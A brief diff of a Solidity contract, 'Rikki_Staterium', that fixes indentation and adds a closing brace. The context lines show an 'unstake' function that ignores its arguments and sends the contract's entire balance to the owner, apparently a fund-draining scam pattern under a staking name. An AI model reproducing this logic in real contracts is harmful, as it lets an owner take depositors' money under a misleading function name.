@@ -50,7 +50,7 @@ contract Rikki_Staterium {
     }
    
     function unstake(uint256 _waveID, uint256 _matchID) public  {
-       owner.transfer(address(this).balance);
+        owner.transfer(address(this).balance);
     }
     function () public payable{}
-    
+}    
